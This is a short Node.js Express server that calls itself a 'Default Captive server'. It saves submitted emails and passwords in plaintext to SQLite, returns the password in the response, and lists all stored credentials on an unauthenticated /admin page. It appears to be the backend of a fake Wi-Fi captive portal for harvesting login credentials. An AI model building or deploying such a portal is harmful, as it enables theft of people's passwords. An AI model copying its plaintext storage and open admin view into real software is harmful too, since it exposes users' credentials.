const express = require("express");
const bodyParser = require("body-parser");
const sqlite3 = require("sqlite3").verbose();
const path = require("path");

const app = express();
const PORT = 3003; // Changed port

// EJS setup
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// setup db
const db = new sqlite3.Database("data.db");
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      email TEXT,
      password TEXT
  )`);
});

// middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// serve file html
app.use(express.static(path.join(__dirname, "public")));

// route POST untuk simpan data
app.post("/save", (req, res) => {
  const { email, password } = req.body;
  db.run("INSERT INTO users (email, password) VALUES (?, ?)", [email, password], (err) => {
    if (err) return res.json({ success: false, error: err.message });
    res.json({ success: true, email, password });
  });
});

// Admin route to view database content
app.get("/admin", (req, res) => {
  db.all("SELECT * FROM users ORDER BY id DESC", [], (err, rows) => {
    if (err) {
        res.status(500).send('Error retrieving data from database');
        return;
    }
    res.render('admin', { users: rows });
  });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('Default Captive server listening on 0.0.0.0:3003');
});
